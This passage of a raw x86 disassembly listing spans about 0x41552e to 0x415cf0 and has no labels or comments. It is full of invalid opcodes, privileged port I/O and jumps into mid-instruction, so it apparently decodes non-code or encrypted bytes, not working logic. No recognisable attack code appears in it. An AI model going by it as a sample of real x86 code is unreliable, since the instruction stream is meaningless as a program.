  41552e:	fstp   DWORD PTR [esi+0x3a]
  415531:	fsubp  st(1),st
  415533:	fcom   DWORD PTR [ecx-0x3ff608c1]
  415539:	dec    ebx
  41553a:	jno    0x41553b
  41553c:	shr    DWORD PTR [esi],1
  41553e:	or     al,0xbc
  415540:	(bad)  
  415541:	mov    bh,0x5e
  415543:	mov    edx,0x63d98211
  415548:	push   es
  415549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41554a:	add    ch,bh
  41554c:	adc    esp,esi
  41554e:	sub    al,0x51
  415550:	sub    al,0x2f
  415552:	adc    BYTE PTR [eax],cl
  415554:	stc    
  415555:	or     DWORD PTR [ecx],eax
  415557:	xor    cl,BYTE PTR [ecx-0x46]
  41555a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41555b:	jae    0x415533
  41555d:	aas    
  41555e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41555f:	loope  0x415572
  415561:	push   ebx
  415562:	xchg   esi,eax
  415563:	into   
  415564:	mov    edx,0x1bbcdda4
  415569:	add    DWORD PTR [esi],esi
  41556b:	jmp    0xede1e9a7
  415570:	lds    eax,FWORD PTR [ecx-0x50081d5b]
  415576:	stos   DWORD PTR es:[edi],eax
  415577:	xchg   ecx,eax
  415578:	test   dl,ch
  41557a:	test   eax,0xc948c7ec
  41557f:	leave  
  415580:	push   es
  415581:	arpl   WORD PTR [edx],sp
  415583:	xor    al,BYTE PTR [ebp+0x19]
  415586:	sub    eax,0xc9eb91ff
  41558b:	scas   eax,DWORD PTR es:[edi]
  41558c:	jmp    0x897535f2
  415591:	jp     0x415564
  415593:	test   BYTE PTR [edx-0x44],ch
  415596:	dec    eax
  415597:	jb     0x4155f5
  415599:	mov    bh,BYTE PTR [ecx-0x37437d2]
  41559f:	cwde   
  4155a0:	(bad)  
  4155a1:	outs   dx,BYTE PTR ds:[esi]
  4155a2:	call   0x2acf:0x68bff1c
  4155a9:	inc    ebx
  4155aa:	xchg   dl,bl
  4155ac:	mov    ch,0x66
  4155ae:	add    eax,0x68a2eb40
  4155b3:	adc    edx,ebp
  4155b5:	or     ax,0x74e2
  4155b9:	test   BYTE PTR [esi],0x78
  4155bc:	les    eax,FWORD PTR [eax-0x5d]
  4155bf:	sbb    BYTE PTR [ebp+ecx*4-0x33f3b0bd],dl
  4155c6:	mov    edi,ss
  4155c8:	jg     0x415602
  4155ca:	xor    ecx,DWORD PTR [ebp+eiz*4-0x9]
  4155ce:	cs push eax
  4155d0:	aaa    
  4155d1:	mov    al,ds:0x8ef54684
  4155d6:	scas   eax,DWORD PTR es:[edi]
  4155d7:	sub    BYTE PTR [esi+0xb28ab68],al
  4155dd:	inc    edi
  4155de:	jecxz  0x415607
  4155e0:	iret   
  4155e1:	xchg   ebx,eax
  4155e2:	jge    0x415658
  4155e4:	mov    edx,0xbb28f63
  4155e9:	in     eax,dx
  4155ea:	loopne 0x415612
  4155ec:	mov    esi,0x82ace5aa
  4155f1:	push   es
  4155f2:	shl    BYTE PTR [esi],cl
  4155f4:	inc    edi
  4155f5:	test   esp,ecx
  4155f7:	movd   DWORD PTR [edx+0x44],mm4
  4155fb:	or     BYTE PTR ds:0xdee8a58c,bl
  415601:	xchg   BYTE PTR [edi+0x143d969a],cl
  415607:	stos   BYTE PTR es:[edi],al
  415608:	or     al,0xa6
  41560a:	sub    al,0xa4
  41560c:	mov    ebp,0xd302324b
  415611:	(bad)  
  415612:	mov    bl,0xd1
  415614:	or     eax,0x26e57568
  415619:	mov    edx,0x7a772651
  41561e:	(bad)  ds:[ebp-0x3b5eb24a]
  415625:	mov    edx,0x2f04970f
  41562a:	inc    esi
  41562b:	jb     0x4155d7
  41562d:	sub    DWORD PTR [esi],ebp
  41562f:	fist   DWORD PTR [eax+0x53270bff]
  415635:	frstor [ecx+0x30]
  415638:	loop   0x415664
  41563a:	test   eax,0x4493934b
  41563f:	pop    ebx
  415640:	popa   
  415641:	dec    ecx
  415642:	push   0xffffffb2
  415644:	mov    ch,0x55
  415646:	ffreep st(7)
  415648:	pop    eax
  415649:	into   
  41564a:	adc    BYTE PTR [edi-0x1a],dl
  41564d:	mov    bh,0xf1
  41564f:	pop    eax
  415650:	rol    DWORD PTR [ecx+eiz*2],1
  415653:	(bad)  
  415654:	or     ebx,DWORD PTR [ebx]
  415656:	repz jb 0x415615
  415659:	and    al,0xc6
  41565b:	mov    dl,0x17
  41565d:	xchg   esi,eax
  41565e:	xchg   edi,eax
  41565f:	fiadd  DWORD PTR [edx+0x5b]
  415662:	(bad)  
  415663:	push   esi
  415664:	pop    edx
  415665:	fnsave [eax]
  415667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415668:	or     edx,DWORD PTR [ecx-0x5a]
  41566b:	sahf   
  41566c:	imul   edx,DWORD PTR [edi],0x9168eb07
  415672:	lods   al,BYTE PTR ds:[esi]
  415673:	cdq    
  415674:	test   DWORD PTR [ebx],edx
  415676:	adc    eax,0x972332e8
  41567b:	out    dx,eax
  41567c:	jle    0x41562f
  41567e:	adc    al,0xd
  415680:	mov    ds:0x33bd0016,eax
  415685:	cmp    BYTE PTR [edx],bh
  415687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415688:	push   edi
  415689:	sti    
  41568a:	rcl    al,1
  41568c:	idiv   DWORD PTR [ebx]
  41568e:	mov    WORD PTR [edx+0x6e],gs
  415691:	pushf  
  415692:	mov    cl,0xf5
  415694:	mov    edi,0xa857fe96
  415699:	mov    esi,0x4c5c8aa9
  41569e:	fisubr WORD PTR [eax+0x53c2c237]
  4156a4:	jno    0x4156eb
  4156a6:	jecxz  0x415697
  4156a8:	jmp    0x2bcd:0x16e38f91
  4156af:	mov    ch,0x47
  4156b1:	dec    esp
  4156b2:	(bad)  
  4156b3:	lods   eax,DWORD PTR ds:[esi]
  4156b4:	shl    BYTE PTR [esi+eiz*8-0x28],cl
  4156b8:	mov    esi,0x97187ceb
  4156bd:	test   BYTE PTR [edi-0x4b],ch
  4156c0:	mov    cl,0xce
  4156c2:	inc    edx
  4156c3:	cmp    bh,BYTE PTR [esi+0x39]
  4156c6:	mov    DWORD PTR ss:0xaec77f26,edi
  4156cd:	sbb    BYTE PTR [edi+0x4196fa3f],bl
  4156d3:	xor    DWORD PTR es:[esi+0x1c05808f],esp
  4156da:	mov    eax,0x6f14c8ed
  4156df:	sub    ah,al
  4156e1:	in     eax,0x43
  4156e3:	dec    edx
  4156e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156e5:	cli    
  4156e6:	fst    DWORD PTR [ebp+0x3d]
  4156e9:	push   ebp
  4156ea:	aam    0x37
  4156ec:	pop    ecx
  4156ed:	sub    DWORD PTR [ebp-0x54f91a0a],eax
  4156f3:	scas   al,BYTE PTR es:[edi]
  4156f4:	call   0x95d7:0x6201e580
  4156fb:	jmp    0x415761
  4156fd:	sahf   
  4156fe:	cmp    cl,bh
  415700:	movzx  esp,BYTE PTR [edx+0x1c86954b]
  415707:	or     DWORD PTR ds:0xe358b8d5,edx
  41570d:	pusha  
  41570e:	xchg   ecx,eax
  41570f:	mov    ecx,0xaec89c39
  415714:	pop    ebx
  415715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415716:	sub    DWORD PTR [ecx+0x49cdb8dd],0x749f04a2
  415720:	dec    ebx
  415721:	add    eax,0xc4f2696
  415726:	jl     0x415704
  415728:	push   edx
  415729:	cmp    eax,0x33158f91
  41572e:	out    0x54,eax
  415730:	mov    ds:0x7639cd56,eax
  415735:	lds    ebx,FWORD PTR [edi-0xfd2ce58]
  41573b:	lods   eax,DWORD PTR ds:[esi]
  41573c:	sbb    al,0x8c
  41573e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41573f:	cmp    BYTE PTR [ecx+ecx*8],bh
  415742:	imul   ecx,DWORD PTR [ebp+0x2542babe],0x97714877
  41574c:	or     DWORD PTR [ebx],eax
  41574e:	(bad)  
  41574f:	or     BYTE PTR [ecx+0x68],dh
  415752:	xlat   BYTE PTR ds:[ebx]
  415753:	push   esi
  415754:	jle    0x4157a4
  415756:	push   ecx
  415757:	bnd je 0x415746
  41575a:	fcomp  st(5)
  41575c:	cmp    ch,ah
  41575e:	sbb    DWORD PTR [ebp+0x3d],edi
  415761:	jge    0x41576d
  415763:	fcom   DWORD PTR [edi+0x198960b4]
  415769:	mov    ah,BYTE PTR ds:0xdd9a9d8c
  41576f:	outs   dx,DWORD PTR ds:[esi]
  415770:	(bad)  
  415771:	pop    edx
  415772:	les    esi,FWORD PTR [ecx+0x378340df]
  415778:	adc    al,0x7f
  41577a:	out    0xe6,eax
  41577c:	dec    ecx
  41577d:	int3   
  41577e:	mov    bl,0x8d
  415780:	bound  ebp,QWORD PTR [ecx+0x52]
  415783:	popa   
  415784:	rcl    DWORD PTR [esi-0x7d4136e1],1
  41578a:	push   ebx
  41578b:	je     0x4157a0
  41578d:	dec    ebx
  41578e:	fcomp  QWORD PTR [esi-0x7e]
  415791:	sub    esp,DWORD PTR [edx-0x78110b83]
  415797:	pop    esi
  415798:	shl    edx,1
  41579a:	xor    ah,cl
  41579c:	dec    ebp
  41579d:	mov    DWORD PTR [eax],esp
  41579f:	rcl    DWORD PTR [edx-0x4a08892c],1
  4157a5:	or     BYTE PTR [ecx+0x1d],bl
  4157a8:	cmp    bh,dl
  4157aa:	cld    
  4157ab:	inc    edi
  4157ac:	jnp    0x415743
  4157ae:	ror    ebx,0xda
  4157b1:	ja     0x41582e
  4157b3:	mov    dh,0x32
  4157b5:	mov    ecx,0x7a7be8fe
  4157ba:	daa    
  4157bb:	pop    ebx
  4157bc:	jnp    0x415777
  4157be:	(bad)  
  4157bf:	cwde   
  4157c0:	scas   eax,DWORD PTR es:[edi]
  4157c1:	jbe    0x4157c5
  4157c3:	enter  0xb8d4,0xb2
  4157c7:	dec    esp
  4157c8:	adc    al,BYTE PTR [ecx-0x66]
  4157cb:	xor    BYTE PTR [ebp+0x35],ch
  4157ce:	mov    ds:0x6ee32739,al
  4157d3:	xchg   esp,eax
  4157d4:	push   ebx
  4157d5:	ret    0xb5de
  4157d8:	js     0x415806
  4157da:	jo     0x4157c7
  4157dc:	fld    st(7)
  4157de:	jmp    0x1572:0xa6f55264
  4157e5:	push   ebp
  4157e6:	repz mov ch,0x45
  4157e9:	out    dx,al
  4157ea:	ss push ds
  4157ec:	xor    bh,BYTE PTR [ebx]
  4157ee:	pop    eax
  4157ef:	xor    BYTE PTR [ecx],dl
  4157f1:	sub    BYTE PTR [esi],ch
  4157f3:	fcmovb st,st(2)
  4157f5:	popa   
  4157f6:	sub    eax,0x2ec6567a
  4157fb:	jmp    0x3ffecfac
  415800:	fadd   DWORD PTR [ecx+0x73187d62]
  415806:	ins    DWORD PTR es:[edi],dx
  415807:	push   ebx
  415808:	sbb    edi,eax
  41580a:	mov    edx,0x678fc84c
  41580f:	and    bl,BYTE PTR [edi]
  415811:	push   eax
  415812:	and    eax,0xee99f606
  415817:	loope  0x415871
  415819:	sub    al,0x9c
  41581b:	dec    esp
  41581c:	push   eax
  41581d:	mov    BYTE PTR [ebx+eax*2-0x751e291],al
  415824:	adc    al,0x38
  415826:	frstor [ebx+0x1f0c40c2]
  41582c:	mov    edx,0xa175b99e
  415831:	pop    esi
  415832:	jge    0x415844
  415834:	cmp    eax,0xbd5d65aa
  415839:	ins    DWORD PTR es:[edi],dx
  41583a:	sbb    eax,0x42cf226e
  41583f:	sub    BYTE PTR [edx],ch
  415841:	add    cl,BYTE PTR [ebx-0x19e2f66b]
  415847:	div    BYTE PTR [edx+edx*8]
  41584a:	cmp    al,0x55
  41584c:	popa   
  41584d:	outs   dx,DWORD PTR ds:[esi]
  41584e:	(bad)  
  415850:	push   ebx
  415851:	retf   
  415852:	adc    esp,ebx
  415854:	mov    DWORD PTR [eax-0x4],edx
  415857:	mov    al,0x85
  415859:	add    eax,0xd02801cf
  41585e:	mov    dl,0x4a
  415860:	pop    esi
  415861:	or     edx,DWORD PTR [esi]
  415863:	dec    esi
  415864:	pop    ebx
  415865:	sub    DWORD PTR [edx],ebp
  415867:	scas   al,BYTE PTR es:[edi]
  415868:	stos   DWORD PTR es:[edi],eax
  415869:	ins    BYTE PTR es:[edi],dx
  41586a:	jmp    0x9813:0xd692916f
  415871:	mov    ds:0x1d9573c5,al
  415876:	fsub   DWORD PTR [ebp+0x32]
  415879:	ror    DWORD PTR [esi],cl
  41587b:	retf   
  41587c:	jo     0x415811
  41587e:	mov    eax,0xba98cab5
  415883:	push   ds
  415884:	inc    ecx
  415885:	out    dx,eax
  415886:	std    
  415887:	sub    al,0x61
  415889:	rcr    bh,1
  41588b:	cli    
  41588c:	or     BYTE PTR [ebx-0x5e],0xbd
  415890:	call   FWORD PTR [edx-0x75]
  415893:	dec    ecx
  415894:	mov    bh,BYTE PTR [edx+0x11]
  415897:	stos   DWORD PTR es:[edi],eax
  415898:	gs in  al,0x54
  41589b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41589c:	or     BYTE PTR [ecx-0x1ce4ca70],cl
  4158a2:	xchg   ebx,eax
  4158a3:	add    DWORD PTR [ebx],esp
  4158a5:	mov    dl,0x24
  4158a7:	clc    
  4158a8:	loop   0x4158c1
  4158aa:	sub    bh,ch
  4158ac:	add    BYTE PTR [ebx],bl
  4158ae:	pop    ss
  4158af:	push   edx
  4158b0:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4158b2:	call   0x2f21:0xf459263d
  4158b9:	push   edx
  4158ba:	mov    esi,0x7f2441ea
  4158bf:	push   cs
  4158c0:	lock pop esi
  4158c2:	lea    esp,[esi-0x72014031]
  4158c8:	clc    
  4158c9:	jb     0x41589a
  4158cb:	mov    ds:0x9a6bcab5,eax
  4158d0:	ins    BYTE PTR es:[edi],dx
  4158d1:	xor    DWORD PTR [ebp-0x13],0x74c38ac4
  4158d8:	jmp    0x4158f4
  4158da:	mov    ds:0x3ff66a9c,eax
  4158df:	xchg   edx,eax
  4158e0:	or     edi,DWORD PTR [edi]
  4158e2:	fwait
  4158e3:	rol    DWORD PTR [ebx-0x419f6083],1
  4158e9:	mul    BYTE PTR [ebp+0x3d3594d5]
  4158ef:	scas   eax,DWORD PTR es:[edi]
  4158f0:	push   ds
  4158f1:	inc    ecx
  4158f2:	out    0x9,al
  4158f4:	jp     0x4158a4
  4158f6:	stos   DWORD PTR es:[edi],eax
  4158f7:	dec    ebx
  4158f8:	jnp    0x415963
  4158fa:	jge    0x41593c
  4158fc:	jnp    0x4158e1
  4158fe:	sub    ecx,DWORD PTR [ebx+0x1269cca5]
  415904:	rol    DWORD PTR [eax],0xda
  415907:	mov    dl,0x13
  415909:	fmul   DWORD PTR [ebx-0x3a5b2415]
  41590f:	aaa    
  415910:	ret    
  415911:	cli    
  415912:	add    DWORD PTR [eax-0x25],eax
  415915:	pop    ss
  415916:	cmp    ch,dh
  415918:	(bad)  
  415919:	daa    
  41591a:	shl    BYTE PTR [eax+0x668827f9],cl
  415920:	dec    edx
  415921:	xor    DWORD PTR [ebx],esi
  415923:	loop   0x41599a
  415925:	xor    eax,0xf7b97356
  41592a:	(bad)  
  41592b:	push   edx
  41592c:	fst    DWORD PTR [edi]
  41592e:	icebp  
  41592f:	mov    ebx,0x25e800d5
  415934:	cli    
  415935:	jl     0x415912
  415937:	adc    bl,BYTE PTR [edi]
  415939:	dec    esi
  41593a:	inc    ecx
  41593b:	add    cl,0x73
  41593e:	inc    edx
  41593f:	test   al,0xaf
  415941:	pinsrw mm0,edi,0x31
  415945:	cmc    
  415946:	mov    WORD PTR [edx+0x1c76c721],?
  41594c:	ins    BYTE PTR es:[edi],dx
  41594d:	mov    esp,0x9ab3637c
  415952:	out    dx,eax
  415953:	add    cl,BYTE PTR [eax-0x41168a66]
  415959:	mov    BYTE PTR [edx-0x6e9f1b99],0xcc
  415960:	mov    dh,BYTE PTR [edi+eiz*2-0x5839d51]
  415967:	hlt    
  415968:	mov    cl,0x2a
  41596a:	or     BYTE PTR [ebx-0x6ff0ce5e],bl
  415970:	pop    es
  415971:	adc    eax,0x5d0c8e94
  415976:	xchg   esp,eax
  415977:	ret    0x70e6
  41597a:	aaa    
  41597b:	cld    
  41597c:	add    bh,BYTE PTR [esi+0x4715befd]
  415982:	das    
  415983:	daa    
  415984:	nop
  415985:	in     al,dx
  415986:	aad    0xbb
  415988:	clc    
  415989:	pop    esp
  41598a:	int    0xd0
  41598c:	outs   dx,DWORD PTR ds:[esi]
  41598d:	and    BYTE PTR [esi+esi*4],dl
  415990:	addr16 lock mov dh,0x24
  415994:	inc    ebp
  415995:	inc    ecx
  415996:	repz adc ebp,esi
  415999:	jne    0x415922
  41599b:	cld    
  41599c:	xor    al,0xf1
  41599e:	(bad)  
  41599f:	push   esp
  4159a0:	jno    0x4159ac
  4159a2:	inc    ebx
  4159a3:	call   0x77caf8c1
  4159a8:	cvtps2pi mm7,QWORD PTR [edx]
  4159ab:	cmp    eax,0x8141f272
  4159b0:	add    esi,DWORD PTR [ebx-0x27]
  4159b3:	orps   xmm5,XMMWORD PTR [ecx-0x70]
  4159b7:	xchg   al,bl
  4159b9:	jge    0x415a21
  4159bb:	inc    edx
  4159bc:	ins    BYTE PTR es:[edi],dx
  4159bd:	xor    eax,0xbec250ac
  4159c2:	in     al,dx
  4159c3:	sbb    DWORD PTR [ebx-0xafff289],ebp
  4159c9:	pop    edx
  4159ca:	and    DWORD PTR [esi+0x50c5e43a],edi
  4159d0:	jle    0x41599b
  4159d2:	push   ss
  4159d3:	cmc    
  4159d4:	into   
  4159d5:	sahf   
  4159d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159d7:	sub    al,0x49
  4159d9:	das    
  4159da:	inc    esi
  4159db:	repnz addr16 dec esi
  4159de:	inc    ebx
  4159df:	sti    
  4159e0:	clc    
  4159e1:	cmp    DWORD PTR [eax-0x19],0x2627b0f0
  4159e8:	mov    ebp,0x43d7aff5
  4159ed:	out    dx,al
  4159ee:	out    0x5d,eax
  4159f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159f1:	xor    eax,0xce6c7556
  4159f6:	push   es
  4159f7:	pop    ds
  4159f8:	and    DWORD PTR [eax],0x3e9cb6d0
  4159fe:	enter  0x11f9,0xa7
  415a02:	cwde   
  415a03:	mov    ebx,0x2f45fd3f
  415a08:	dec    DWORD PTR ds:0xbb9f857a
  415a0e:	and    ebx,DWORD PTR [esp+edi*8+0x31]
  415a12:	cmp    dl,BYTE PTR [edx+0x13]
  415a15:	add    DWORD PTR [eax],esi
  415a17:	dec    ecx
  415a18:	cwde   
  415a19:	je     0x415a63
  415a1b:	ds clc 
  415a1d:	push   ebx
  415a1e:	adc    al,0xe8
  415a20:	lds    edx,FWORD PTR [edi]
  415a22:	outs   dx,BYTE PTR ds:[esi]
  415a23:	gs (bad) 
  415a25:	mov    edi,edx
  415a27:	pop    esi
  415a28:	xchg   esi,eax
  415a29:	mov    edx,0x12f103a
  415a2e:	cmp    cl,dl
  415a30:	fisttp QWORD PTR [esi+ebp*4+0x62]
  415a34:	mov    DWORD PTR [esi+edx*2],0xf8ce4245
  415a3b:	fucomi st,st(3)
  415a3d:	(bad)  
  415a3e:	and    eax,0xa7927ee1
  415a43:	in     eax,dx
  415a44:	inc    esi
  415a45:	popa   
  415a46:	or     al,0x29
  415a48:	ret    
  415a49:	lods   al,BYTE PTR ds:[esi]
  415a4a:	xchg   esp,eax
  415a4b:	imul   eax,eax,0x719300a9
  415a51:	add    ebp,esp
  415a53:	ret    
  415a54:	xchg   DWORD PTR [esi-0x13ed7bbb],ebx
  415a5a:	cmp    eax,0x9f300636
  415a5f:	ja     0x415a0d
  415a61:	sub    DWORD PTR [esi-0x51],0x2c
  415a65:	sub    al,0x38
  415a67:	mov    ebp,0xa0a40639
  415a6c:	mov    al,BYTE PTR [esi-0x501a9dc]
  415a72:	and    DWORD PTR [edx-0x4c],edx
  415a75:	add    al,0xc7
  415a77:	data16 je 0x415ad8
  415a7a:	lds    ebp,FWORD PTR [ebp+0x16d9f3ba]
  415a80:	mov    eax,0xfca3b93c
  415a85:	xor    BYTE PTR [ebp-0x641e220b],dl
  415a8b:	stos   BYTE PTR es:[edi],al
  415a8c:	push   esi
  415a8d:	xchg   esp,eax
  415a8e:	dec    ebp
  415a8f:	add    dl,ah
  415a91:	aad    0x61
  415a93:	dec    edi
  415a94:	cld    
  415a95:	or     al,0xe0
  415a97:	ror    DWORD PTR [edi+0xb5c2a4c],cl
  415a9d:	iret   
  415a9e:	mov    eax,0x83c1f9a9
  415aa3:	stc    
  415aa4:	shr    BYTE PTR [ebp+0x71071fd5],1
  415aaa:	dec    ecx
  415aab:	jnp    0x415aaa
  415aad:	in     al,0xc8
  415aaf:	push   ebp
  415ab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ab1:	shr    dh,0xcd
  415ab4:	rcl    BYTE PTR [edx+ebx*2],0xce
  415ab8:	in     eax,dx
  415ab9:	add    dh,BYTE PTR [edx+ebp*4+0x7b]
  415abd:	shl    BYTE PTR [ecx+0x67867693],1
  415ac3:	xchg   esi,eax
  415ac4:	or     bh,ch
  415ac6:	scas   al,BYTE PTR es:[edi]
  415ac7:	push   esp
  415ac8:	aaa    
  415ac9:	and    dh,BYTE PTR [eax+0x62]
  415acc:	(bad)  [ebp+edi*2+0x55]
  415ad0:	fidivr WORD PTR [esi+0x7ec7f4e7]
  415ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ad7:	fcomp  QWORD PTR [ecx+0x7a654bc2]
  415add:	iret   
  415ade:	(bad)  
  415adf:	jmp    0xb5c9:0xab07eeef
  415ae6:	adc    bh,BYTE PTR [edi-0x73547f5f]
  415aec:	adc    eax,edx
  415aee:	pop    edi
  415aef:	or     BYTE PTR [ebp-0x5eac96cc],cl
  415af5:	mov    eax,0xd1898eea
  415afa:	in     al,dx
  415afb:	mov    ah,0xd2
  415afd:	out    dx,al
  415afe:	dec    ebp
  415aff:	xor    BYTE PTR [ebp-0x615a0fcb],bh
  415b05:	fwait
  415b06:	mov    ds:0xb8a00adf,eax
  415b0b:	sub    edi,DWORD PTR [eax+0xd]
  415b0e:	mov    bl,BYTE PTR [esi+0x41]
  415b11:	(bad)  
  415b12:	leave  
  415b13:	rcr    DWORD PTR [edx+0x30],1
  415b16:	(bad)  
  415b17:	fcmovbe st,st(1)
  415b19:	cdq    
  415b1a:	mov    bh,0x6f
  415b1c:	jae    0x415b8a
  415b1e:	add    ecx,DWORD PTR [eax]
  415b20:	jne    0x415b35
  415b22:	inc    ebx
  415b23:	outs   dx,BYTE PTR ds:[esi]
  415b24:	sbb    eax,0x3ca0931
  415b29:	cmovbe edi,DWORD PTR [edx]
  415b2c:	aad    0x76
  415b2e:	sbb    bh,BYTE PTR [edx+0xf]
  415b31:	ret    0x1329
  415b34:	test   BYTE PTR [ebp-0x424fb3ed],bl
  415b3a:	or     DWORD PTR [edi],edx
  415b3c:	enter  0x7531,0x95
  415b40:	repnz pushf 
  415b42:	pop    esi
  415b43:	inc    edi
  415b44:	fidivr DWORD PTR [ebx+0x1]
  415b47:	dec    edx
  415b48:	enter  0x4e07,0x8a
  415b4c:	dec    esi
  415b4d:	enter  0xd4c1,0x2a
  415b51:	push   ebp
  415b52:	dec    esp
  415b53:	and    BYTE PTR [eax],ah
  415b55:	dec    edi
  415b56:	lds    ebp,FWORD PTR [esi+0x642848]
  415b5c:	shr    ecx,0xd8
  415b5f:	pop    esp
  415b60:	cdq    
  415b61:	jmp    DWORD PTR [esi+0x41]
  415b64:	add    al,0x26
  415b66:	mov    ebp,0x3216cf29
  415b6b:	push   edx
  415b6c:	push   esp
  415b6d:	frstor ds:0xd154d5e1
  415b73:	push   es
  415b74:	push   edi
  415b75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b76:	cmc    
  415b77:	xchg   esi,eax
  415b78:	aaa    
  415b79:	xor    bh,BYTE PTR [edi+0x6ac293ed]
  415b7f:	add    ecx,esi
  415b81:	retf   0x80ba
  415b84:	or     edx,DWORD PTR [ecx-0x280ff0ff]
  415b8a:	scas   eax,DWORD PTR es:[edi]
  415b8b:	pop    eax
  415b8c:	mov    ds:0x279bc9e7,al
  415b91:	mov    ebp,0xc4cabe8f
  415b96:	lods   al,BYTE PTR ds:[esi]
  415b97:	aad    0x5b
  415b99:	loopne 0x415b1b
  415b9b:	das    
  415b9c:	lods   eax,DWORD PTR ds:[esi]
  415b9d:	dec    edi
  415b9e:	jmp    0x6769:0x50a9b542
  415ba5:	push   cs
  415ba6:	arpl   WORD PTR [edx+0x6b7098b5],cx
  415bac:	or     cl,BYTE PTR ds:[edi-0x7d]
  415bb0:	mov    ?,WORD PTR [eax+ebp*4+0x3b]
  415bb4:	sbb    esi,esp
  415bb6:	push   ecx
  415bb7:	dec    ebp
  415bb8:	mov    BYTE PTR [esi+ecx*2+0x2b],al
  415bbc:	inc    esp
  415bbd:	std    
  415bbe:	div    BYTE PTR [eax+0x64]
  415bc1:	xchg   dx,ax
  415bc3:	jne    0x415b57
  415bc5:	sub    al,0xfb
  415bc7:	fwait
  415bc8:	sbb    al,0xa
  415bca:	jecxz  0x415c03
  415bcc:	and    bh,cl
  415bce:	push   ss
  415bcf:	mov    ebp,0x415f4160
  415bd4:	sbb    al,0x46
  415bd6:	test   eax,0xc1cb3c46
  415bdb:	cdq    
  415bdc:	pusha  
  415bdd:	(bad)  
  415bde:	jnp    0x415c41
  415be0:	into   
  415be1:	imul   ebx,eax,0x5bbc8faf
  415be7:	icebp  
  415be8:	in     al,0xcb
  415bea:	xchg   ebp,eax
  415beb:	in     eax,0x4e
  415bed:	pop    ecx
  415bee:	sub    eax,0x5ca96bed
  415bf3:	addr16 pop edx
  415bf5:	jnp    0x415c05
  415bf7:	and    esp,ecx
  415bf9:	mov    esi,0xb0369b8b
  415bfe:	bound  edi,QWORD PTR [ebp+0x7]
  415c01:	idiv   DWORD PTR ds:0x23a82dfd
  415c07:	rcr    BYTE PTR [edi+0x3d69b917],cl
  415c0d:	xor    DWORD PTR [esi+0x2],0x91e3197f
  415c14:	repnz xor bx,bx
  415c18:	(bad)  
  415c19:	push   edi
  415c1a:	mov    ebp,ss
  415c1c:	push   ebp
  415c1d:	sub    eax,0x1d15939a
  415c22:	in     al,dx
  415c23:	xchg   ebp,eax
  415c24:	and    ah,BYTE PTR [eax-0x24]
  415c27:	inc    esi
  415c28:	pop    edx
  415c29:	mov    edi,?
  415c2b:	out    0x7,eax
  415c2d:	lds    edi,FWORD PTR [esi]
  415c2f:	repnz xchg ecx,eax
  415c31:	mov    bl,0x81
  415c33:	mov    edx,0x7fb041ef
  415c38:	or     ecx,DWORD PTR [edi+edi*4+0x60bc36ce]
  415c3f:	pop    edx
  415c40:	push   0x69
  415c42:	adc    DWORD PTR [esi+edi*1+0x3a],ebx
  415c46:	jle    0x415c34
  415c48:	push   ebx
  415c49:	sub    DWORD PTR [ebx-0x7ad628ca],ebp
  415c4f:	push   0xffffff89
  415c51:	stos   DWORD PTR es:[edi],eax
  415c52:	or     DWORD PTR [eax-0x3c],esi
  415c55:	mov    dh,BYTE PTR [esi]
  415c57:	xchg   ebx,eax
  415c58:	inc    ecx
  415c59:	loopne 0x415c20
  415c5b:	sahf   
  415c5c:	call   0x43ffba9
  415c61:	shl    DWORD PTR [bp+0xb1a],0x52
  415c67:	cwde   
  415c68:	inc    esi
  415c69:	repz or al,0xca
  415c6c:	add    eax,0xc9a26fa8
  415c71:	outs   dx,DWORD PTR ds:[esi]
  415c72:	xchg   DWORD PTR ds:0xdfcbc85f,ecx
  415c78:	sub    DWORD PTR [ecx],0x643765e0
  415c7e:	enter  0x9c6f,0xb5
  415c82:	sub    DWORD PTR [eax-0x77],ebx
  415c85:	adc    ebp,DWORD PTR [edi]
  415c87:	mov    eax,gs
  415c89:	mov    al,ds:0x9f7802f6
  415c8e:	mov    cl,0xc7
  415c90:	in     eax,dx
  415c91:	inc    ebp
  415c92:	xor    ah,BYTE PTR [ebx+ebx*4-0x40]
  415c96:	int    0x9a
  415c98:	push   ebp
  415c99:	in     eax,0x8d
  415c9b:	jns    0x415c83
  415c9d:	inc    ecx
  415c9e:	mov    ax,ds:0xa72c855c
  415ca4:	fldcw  WORD PTR [ecx-0x6]
  415ca7:	cld    
  415ca8:	push   cs
  415ca9:	inc    ecx
  415caa:	sub    al,0xa9
  415cac:	push   0x32
  415cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415caf:	and    BYTE PTR [ebp+0x4abbf410],0xe2
  415cb6:	fwait
  415cb7:	jmp    DWORD PTR [edx-0x5d]
  415cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cbb:	inc    eax
  415cbc:	sbb    DWORD PTR [ebp+0x7b564ce],edx
  415cc2:	shr    BYTE PTR [eax+0x55],cl
  415cc5:	fsub   QWORD PTR [eax+0x480114c8]
  415ccb:	ins    BYTE PTR es:[edi],dx
  415ccc:	mov    ds:0xba54ad19,eax
  415cd1:	and    al,0xa1
  415cd3:	and    esp,0xd6a1d660
  415cd9:	adc    edi,DWORD PTR [eax]
  415cdb:	push   ecx
  415cdc:	pop    DWORD PTR [edx]
  415cde:	out    0x8,al
  415ce0:	je     0x415c9e
  415ce2:	or     dl,ch
  415ce4:	pop    ecx
  415ce5:	aam    0x97
  415ce7:	xchg   esi,eax
  415ce8:	lea    edx,fs:[eax-0x66]
  415cec:	sbb    edx,DWORD PTR [ecx+0x5]
  415cef:	push   ebp
  415cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
